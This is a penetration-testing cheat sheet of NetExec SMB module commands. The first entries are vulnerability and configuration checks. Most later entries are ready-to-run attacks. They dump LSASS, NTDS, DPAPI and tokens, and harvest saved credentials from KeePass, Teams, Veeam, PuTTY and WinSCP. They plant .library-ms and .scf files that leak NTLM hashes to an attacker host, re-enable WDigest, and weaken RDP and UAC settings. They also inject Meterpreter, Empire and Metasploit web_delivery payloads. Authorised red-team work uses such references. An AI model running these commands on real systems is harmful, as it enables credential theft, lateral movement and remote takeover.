# NetExec SMB Modules

## nxc smb modules

### enum_av

Identify endpoint protection products on the target via LsarLookupNames. No privilege required.

```sh title:"NetExec SMB Modules Identify EPP/AV/EDR via LsarLookupNames, no privs"
nxc smb $domain -u $user $auth_flags -M enum_av
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_ca

Anonymously hunt for ADCS CAs over RPC endpoints.

```sh title:"NetExec SMB Modules Anonymously hunt ADCS CAs over RPC endpoints"
nxc smb $domain -u $user $auth_flags -M enum_ca
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_cve

Enumerate common CVEs by querying registry OS version + UBR. Quick way to triage missing patches.

```sh title:"NetExec SMB Modules Enumerate CVEs from registry OS version + UBR"
nxc smb $domain -u $user $auth_flags -M enum_cve
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### gpp_privileges

Extract privileges assigned via GPOs and resolve SIDs through LDAP. Maps GPO-granted SeDebug etc.

```sh title:"NetExec SMB Modules GPO-assigned privileges with SIDs resolved via LDAP"
nxc smb $domain -u $user $auth_flags -M gpp_privileges
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ioxidresolver

Identify additional active network interfaces on the host (multi-homed boxes, hidden subnets).

```sh title:"NetExec SMB Modules Find multi-homed hosts via IOXIDResolver"
nxc smb $domain -u $user $auth_flags -M ioxidresolver
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ms17-010

Check for MS17-010 (EternalBlue) exposure. Untested for exploitation, vuln check only.

```sh title:"NetExec SMB Modules Check MS17-010 EternalBlue exposure (vuln check)"
nxc smb $domain -u $user $auth_flags -M ms17-010
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nopac

Check if the DC is vulnerable to NoPac (CVE-2021-42278/42287). Domain user to DA path.

```sh title:"NetExec SMB Modules Check NoPac (CVE-2021-42278/42287) DA escalation"
nxc smb $domain -u $user $auth_flags -M nopac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlm_reflection

Check whether the OS is vulnerable to NTLM reflection (CVE-2025-33073).

```sh title:"NetExec SMB Modules Check NTLM reflection CVE-2025-33073"
nxc smb $domain -u $user $auth_flags -M ntlm_reflection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### printnightmare

Check vulnerability to PrintNightmare (CVE-2021-1675/34527).

```sh title:"NetExec SMB Modules Check PrintNightmare (CVE-2021-1675 / 34527)"
nxc smb $domain -u $user $auth_flags -M printnightmare
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remove-mic

Check vulnerability to CVE-2019-1040 (NTLM MIC removal). Pair with relay attacks.

```sh title:"NetExec SMB Modules Check CVE-2019-1040 NTLM MIC removal, relay prereq"
nxc smb $domain -u $user $auth_flags -M remove-mic
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### sccm-recon6

Check via winreg whether the target is an SCCM Distribution Point or Primary Site Server (RECON-6).

```sh title:"NetExec SMB Modules Check if target is SCCM DP / Primary Site (RECON-6)"
nxc smb $domain -u $user $auth_flags -M sccm-recon6
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### smbghost

Check SMB 3.1.1 dialect + compression flag (SMBGhost CVE-2020-0796).

```sh title:"NetExec SMB Modules Check SMBGhost CVE-2020-0796 dialect + compression"
nxc smb $domain -u $user $auth_flags -M smbghost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### spooler

Detect whether the print spooler service is enabled. Prereq for the printer-bug coercion.

```sh title:"NetExec SMB Modules Detect print spooler enabled, PrinterBug prereq"
nxc smb $domain -u $user $auth_flags -M spooler
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### webdav

Check whether the WebClient service is running on the target. Required for HTTP-based coercion (auth via UNC).

```sh title:"NetExec SMB Modules Check WebClient running, HTTP coercion prereq"
nxc smb $domain -u $user $auth_flags -M webdav
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### zerologon

Check whether the DC is vulnerable to Zerologon (CVE-2020-1472).

```sh title:"NetExec SMB Modules Check Zerologon CVE-2020-1472 on DC"
nxc smb $domain -u $user $auth_flags -M zerologon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### aws-credentials

Search the target filesystem for AWS credential files. Also available on winrm and ssh protocols.

```sh title:"NetExec SMB Modules Hunt AWS credential files (also winrm / ssh)"
nxc smb $domain -u $user $auth_flags -M aws-credentials
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### change-password

Change or reset a user's password via SMB.

```sh title:"NetExec SMB Modules Change / reset user password via SMB"
nxc smb $domain -u $user $auth_flags -M change-password -o USER=$target_user NEWPASS=$target_pass
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var target_pass
-->

### drop-library-ms

Plant a `.library-ms` file on writable shares to coerce NTLMv2 hashes via CVE-2025-24054 (zero-click).

```sh title:"NetExec SMB Modules .library-ms zero-click NTLMv2 theft (CVE-2025-24054)"
nxc smb $domain -u $user $auth_flags -M drop-library-ms -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### scuffy

Drop a `.scf` file with a UNC icon path on every writable share. Triggers NTLM auth when the folder is browsed.

```sh title:"NetExec SMB Modules .scf icon UNC trick on writable shares for NTLM theft"
nxc smb $domain -u $user $auth_flags -M scuffy -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### bitlocker (HIGH)

Read BitLocker status on targets (enabled/disabled).

```sh title:"NetExec SMB Modules Read BitLocker status on target hosts"
nxc smb $domain -u $user $auth_flags -M bitlocker
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_dns (HIGH)

Use WMI to dump DNS records from an AD-integrated DNS server.

```sh title:"NetExec SMB Modules WMI dump of DNS records from AD DNS server"
nxc smb $domain -u $user $auth_flags -M enum_dns
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_interfaces (HIGH)

Read network interface info (name, IP, mask, gateway) from the remote registry.

```sh title:"NetExec SMB Modules Network interface info from remote registry"
nxc smb $domain -u $user $auth_flags -M enum_interfaces
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hyperv-host (HIGH)

Look up which Hyper-V host owns the target VM via registry.

```sh title:"NetExec SMB Modules Look up Hyper-V host of VM via registry"
nxc smb $domain -u $user $auth_flags -M hyperv-host
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### install_elevated (HIGH)

Check the AlwaysInstallElevated registry settings (low-priv MSI install as SYSTEM).

```sh title:"NetExec SMB Modules Check AlwaysInstallElevated for MSI privesc"
nxc smb $domain -u $user $auth_flags -M install_elevated
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_discover (HIGH)

Search for KeePass database files and running KeePass processes on the target.

```sh title:"NetExec SMB Modules Search target for KeePass DBs and processes"
nxc smb $domain -u $user $auth_flags -M keepass_discover
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lockscreendoors (HIGH)

Detect lock-screen backdoors by checking the FileDescription of accessibility binaries (sethc, utilman, etc.).

```sh title:"NetExec SMB Modules Detect sethc/utilman lock-screen backdoors"
nxc smb $domain -u $user $auth_flags -M lockscreendoors
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlmv1 (HIGH)

Detect if `lmcompatibilitylevel` is below 3, meaning NTLMv1 is permitted.

```sh title:"NetExec SMB Modules Detect NTLMv1 permitted (lmcompatibilitylevel < 3)"
nxc smb $domain -u $user $auth_flags -M ntlmv1
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### presence (HIGH)

Trace Domain and Enterprise Admin presence on the target over SMB. Maps where high-priv accounts have logged on.

```sh title:"NetExec SMB Modules Trace DA / EA presence on target over SMB"
nxc smb $domain -u $user $auth_flags -M presence
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-query (HIGH)

Run an arbitrary registry query on the target.

```sh title:"NetExec SMB Modules Arbitrary registry query on target"
nxc smb $domain -u $user $auth_flags -M reg-query -o KEY=$reg_key
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var reg_key
-->

### runasppl (HIGH)

Check whether the LSA RunAsPPL bit is set. If unset, LSASS can be touched by ordinary admin tooling.

```sh title:"NetExec SMB Modules Check LSA RunAsPPL (unset = LSASS dumpable)"
nxc smb $domain -u $user $auth_flags -M runasppl
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### test_connection (HIGH)

Ping a host through nxc to sanity-check reachability before running heavier modules.

```sh title:"NetExec SMB Modules Ping host via nxc, sanity check before heavy modules"
nxc smb $domain -u $user $auth_flags -M test_connection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### uac (HIGH)

Read UAC configuration on the target.

```sh title:"NetExec SMB Modules Read UAC configuration on target"
nxc smb $domain -u $user $auth_flags -M uac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wcc (HIGH)

Run the Windows security configuration check (broad hardening audit).

```sh title:"NetExec SMB Modules Broad Windows hardening / security config audit"
nxc smb $domain -u $user $auth_flags -M wcc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dpapi_hash (HIGH)

Remotely dump DPAPI hashes derived from masterkeys.

```sh title:"NetExec SMB Modules Remotely dump DPAPI hashes from masterkeys"
nxc smb $domain -u $user $auth_flags -M dpapi_hash
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### eventlog_creds (HIGH)

Extract credentials from Windows event logs (4688 process-creation and SYSMON command lines).

```sh title:"NetExec SMB Modules Pull creds from event log 4688 / SYSMON cmdlines"
nxc smb $domain -u $user $auth_flags -M eventlog_creds
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### handlekatz (HIGH)

LSASS dump using handlekatz64, parsed remotely with pypykatz.

```sh title:"NetExec SMB Modules LSASS dump via handlekatz64 + pypykatz parse"
nxc smb $domain -u $user $auth_flags -M handlekatz
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### iis (HIGH)

Read IIS Application Pool configs via appcmd.exe to extract app-pool identity credentials.

```sh title:"NetExec SMB Modules IIS App Pool identity creds via appcmd.exe"
nxc smb $domain -u $user $auth_flags -M iis
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_trigger (HIGH)

Plant a malicious KeePass trigger that exports the database in cleartext on next unlock.

```sh title:"NetExec SMB Modules Plant KeePass trigger, exports DB cleartext on unlock"
nxc smb $domain -u $user $auth_flags -M keepass_trigger
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lsassy (HIGH)

Dump LSASS and parse the result remotely using lsassy.

```sh title:"NetExec SMB Modules Remote LSASS dump + parse via lsassy"
nxc smb $domain -u $user $auth_flags -M lsassy
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### masky (HIGH)

Dump domain user credentials via ADCS + KDC (PKINIT chain to NT hash).

```sh title:"NetExec SMB Modules Dump domain creds via ADCS + KDC (masky PKINIT chain)"
nxc smb $domain -u $user $auth_flags -M masky
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mobaxterm (HIGH)

Dump MobaXterm credentials via remote registry or NTUSER.dat export.

```sh title:"NetExec SMB Modules MobaXterm creds via remote registry / NTUSER.dat"
nxc smb $domain -u $user $auth_flags -M mobaxterm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mremoteng (HIGH)

Dump mRemoteNG passwords from AppData and recursively from Desktop / Documents.

```sh title:"NetExec SMB Modules mRemoteNG passwords from AppData / Desktop / Docs"
nxc smb $domain -u $user $auth_flags -M mremoteng
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### msol (HIGH)

Dump the MSOL cleartext password and Entra ID credentials from the local DB on the Entra ID Connect server.

```sh title:"NetExec SMB Modules MSOL cleartext + Entra ID creds from AAD Connect"
nxc smb $domain -u $user $auth_flags -M msol
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nanodump (HIGH)

LSASS dump using nanodump, parsed remotely with pypykatz. Also available on the mssql protocol.

```sh title:"NetExec SMB Modules LSASS via nanodump + pypykatz parse (also mssql)"
nxc smb $domain -u $user $auth_flags -M nanodump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad (HIGH)

Extract content from the Windows Notepad tab-state binary files (unsaved drafts).

```sh title:"NetExec SMB Modules Notepad unsaved drafts from tab-state binary"
nxc smb $domain -u $user $auth_flags -M notepad
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad++ (HIGH)

Extract Notepad++ unsaved files.

```sh title:"NetExec SMB Modules Notepad++ unsaved files"
nxc smb $domain -u $user $auth_flags -M notepad++
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntds-dump-raw (HIGH)

Extract NTDS.dit, SAM, and SYSTEM by reading the raw disk. Bypasses VSS-based detections. Also runs over winrm and wmi.

```sh title:"NetExec SMB Modules NTDS via raw-disk read (bypasses VSS, also winrm/wmi)"
nxc smb $domain -u $user $auth_flags -M ntds-dump-raw
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntdsutil (HIGH)

Dump NTDS using `ntdsutil.exe` snapshot path.

```sh title:"NetExec SMB Modules NTDS dump via ntdsutil.exe snapshot path"
nxc smb $domain -u $user $auth_flags -M ntdsutil
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### powershell_history (HIGH)

Pull every user's PSReadline history and grep for sensitive command patterns.

```sh title:"NetExec SMB Modules PSReadline history per user, grep for sensitive cmds"
nxc smb $domain -u $user $auth_flags -M powershell_history
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### procdump (HIGH)

LSASS dump using procdump64, parsed remotely with pypykatz.

```sh title:"NetExec SMB Modules LSASS via procdump64 + pypykatz parse"
nxc smb $domain -u $user $auth_flags -M procdump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### putty (HIGH)

Find PuTTY-saved SSH private keys in the registry and download them.

```sh title:"NetExec SMB Modules Find + download PuTTY-saved SSH private keys"
nxc smb $domain -u $user $auth_flags -M putty
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### rdcman (HIGH)

Remotely dump RDCMan (Remote Desktop Connection Manager) saved credentials.

```sh title:"NetExec SMB Modules Remote dump RDCMan saved credentials"
nxc smb $domain -u $user $auth_flags -M rdcman
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recent_files (HIGH)

Extract recently modified files from the target. Useful for finding active project / handover docs.

```sh title:"NetExec SMB Modules Extract recently modified files from target"
nxc smb $domain -u $user $auth_flags -M recent_files
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recyclebin (HIGH)

List and export the contents of users' recycle bins.

```sh title:"NetExec SMB Modules List and export users' recycle bin contents"
nxc smb $domain -u $user $auth_flags -M recyclebin
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-winlogon (HIGH)

Collect autologon credentials stored under the Winlogon registry key.

```sh title:"NetExec SMB Modules Autologon creds from Winlogon registry key"
nxc smb $domain -u $user $auth_flags -M reg-winlogon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### security-questions (HIGH)

Pull users' local-account security questions and answers.

```sh title:"NetExec SMB Modules Local-account security questions and answers"
nxc smb $domain -u $user $auth_flags -M security-questions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### snipped (HIGH)

Download screenshots taken by the new Snipping Tool.

```sh title:"NetExec SMB Modules Download Snipping Tool screenshots from target"
nxc smb $domain -u $user $auth_flags -M snipped
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### teams_localdb (HIGH)

Pull the cleartext `ssoauthcookie` from the local Teams database. Kills running Teams processes if needed.

```sh title:"NetExec SMB Modules Cleartext ssoauthcookie from local Teams DB"
nxc smb $domain -u $user $auth_flags -M teams_localdb
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### veeam (HIGH)

Extract credentials from a local Veeam SQL database. Veeam typically holds backup-target creds across the estate.

```sh title:"NetExec SMB Modules Veeam SQL DB creds (often estate-wide backup creds)"
nxc smb $domain -u $user $auth_flags -M veeam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### vnc (HIGH)

Loot passwords from VNC server and client configuration files.

```sh title:"NetExec SMB Modules Loot VNC server / client config passwords"
nxc smb $domain -u $user $auth_flags -M vnc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wam (HIGH)

Dump access tokens from the Token Broker Cache (Web Account Manager).

```sh title:"NetExec SMB Modules Dump tokens from Token Broker (WAM) cache"
nxc smb $domain -u $user $auth_flags -M wam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wdigest (HIGH)

Toggle the `UseLogonCredential` registry key to re-enable WDigest cleartext credential caching on Win 8.1+.

```sh title:"NetExec SMB Modules Re-enable WDigest cleartext caching via registry"
nxc smb $domain -u $user $auth_flags -M wdigest -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wifi (HIGH)

Pull the keys for every wireless interface on the host.

```sh title:"NetExec SMB Modules Pull keys for every wireless interface on host"
nxc smb $domain -u $user $auth_flags -M wifi
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### winscp (HIGH)

Find WinSCP.ini files in registry and default locations, then extract saved credentials.

```sh title:"NetExec SMB Modules WinSCP saved creds from .ini and registry"
nxc smb $domain -u $user $auth_flags -M winscp
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### empire_exec (HIGH)

Generate an Empire launcher via the RESTful API and execute it on the target.

```sh title:"NetExec SMB Modules Generate + execute Empire launcher via RESTful API"
nxc smb $domain -u $user $auth_flags -M empire_exec
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hash_spider (HIGH)

Dump LSASS recursively starting from a single hash, using BloodHound to chase local admin paths.

```sh title:"NetExec SMB Modules Recursive LSASS dump from one hash via BloodHound paths"
nxc smb $domain -u $user $auth_flags -M hash_spider
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### impersonate (HIGH)

List and impersonate tokens to run commands as locally logged-on users.

```sh title:"NetExec SMB Modules List + impersonate tokens of logged-on users"
nxc smb $domain -u $user $auth_flags -M impersonate
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### met_inject (HIGH)

Download the Meterpreter stager and inject it into memory.

```sh title:"NetExec SMB Modules Download + inject Meterpreter stager in memory"
nxc smb $domain -u $user $auth_flags -M met_inject
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### pi (HIGH)

Run a command as a logged-on user via process injection.

```sh title:"NetExec SMB Modules Run cmd as logged-on user via process injection"
nxc smb $domain -u $user $auth_flags -M pi -o COMMAND=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var cmd
-->

### rdp (HIGH)

Enable or disable RDP on the target via registry. Use to open the door for follow-on lateral movement.

```sh title:"NetExec SMB Modules Enable / disable RDP via registry"
nxc smb $domain -u $user $auth_flags -M rdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remote-uac (HIGH)

Enable or disable remote UAC. Disabling it lets non-domain admin local accounts perform admin actions over the network.

```sh title:"NetExec SMB Modules Toggle remote UAC for local-admin lateral movement"
nxc smb $domain -u $user $auth_flags -M remote-uac -o ACTION=disable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### schtask_as (HIGH)

Remotely create a scheduled task running as a chosen logged-on user.

```sh title:"NetExec SMB Modules Schedule task running as chosen logged-on user"
nxc smb $domain -u $user $auth_flags -M schtask_as -o USER=$target_user CMD=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var cmd
-->

### shadowrdp (HIGH)

Enable or disable Shadow RDP (silent session takeover via RDS shadowing).

```sh title:"NetExec SMB Modules Toggle Shadow RDP for silent session takeover"
nxc smb $domain -u $user $auth_flags -M shadowrdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### web_delivery (HIGH)

Kick off a Metasploit web_delivery payload on the target.

```sh title:"NetExec SMB Modules Kick off Metasploit web_delivery payload"
nxc smb $domain -u $user $auth_flags -M web_delivery
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

